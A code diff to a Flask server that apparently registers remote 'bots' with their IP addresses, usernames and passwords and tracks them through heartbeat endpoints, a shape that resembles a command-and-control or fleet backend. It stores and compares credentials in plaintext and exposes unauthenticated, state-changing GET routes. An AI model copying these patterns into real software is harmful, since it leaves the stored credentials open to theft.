@@ -129,14 +129,15 @@ def resetDB():
 
 @app.route('/addbot', methods=['POST'])
 def addbot():
+    print(request.remote_addr)
     j = request.get_json()
     val = bots_table.find_one({"ip":j['ip']})
     if(val is not None):
         if(val["username"] == j['username'] and val["password"] == j['password']):
-            return jsonify({'code':200,'data':"already exists"})
+            return jsonify({'code':200,'data':"bot already exists"})
         bots_table.delete_one({"ip":j['ip']})
     nextId = getNextSequence(counter,"botId")  
-    result=bots_table.insert_one({'botId':nextId,"ip":j['ip'],"username":j['username'],"password":j['password'],"loaded":0,"directoryName":""})
+    result=bots_table.insert_one({'botId':nextId,"ip":j['ip'],"username":j['username'],"password":j['password'],"loaded":0,"directoryName":"","sourceIP":request.remote_addr,"active":1})
     return jsonify({'code':200})
 
 
@@ -221,11 +222,14 @@ def storeDirectory(ip):
     bots_table.update_one({ 'ip': ip },{"$set":{"directoryName":j["directoryName"]}})
     return jsonify({'code':200})
 
+### =========================================================================================================
+### Heartbeat API which changes the bit of the bot to 1.
+### =========================================================================================================
 
-###Heartbeat API which changes the bit of the bot to 1.
-@app.route('/heartbeatbot/<ip>', methods=['POST'])
-def hearbeat(ip):
-    j = request.get_json()
+
+@app.route('/heartbeatbot', methods=['GET'])
+def heartbeat():
+    ip = str(request.remote_addr)
     val = bots_table.find_one({"ip":ip})
     if(val is None):
         return jsonify({"data" : "device not available"})
@@ -233,9 +237,13 @@ def hearbeat(ip):
     bots_table.update_one({'ip' : ip},{"$set" :{"active" : 1}})
     return jsonify({}),200
 
-#Decrement all by 1
-@app.route('/heartbeatdec',methods=['POST'])
-def heart(ip):
+### =========================================================================================================
+### Decrement all by 1
+### =========================================================================================================
+
+
+@app.route('/heartbeatdec',methods=['GET'])
+def heart():
     bots_table.update_many({"active" : 0},{"$set" : {"active" : -1}})
     bots_table.update_many({"active" : 1},{"$set" : {"active" : 0}})
 
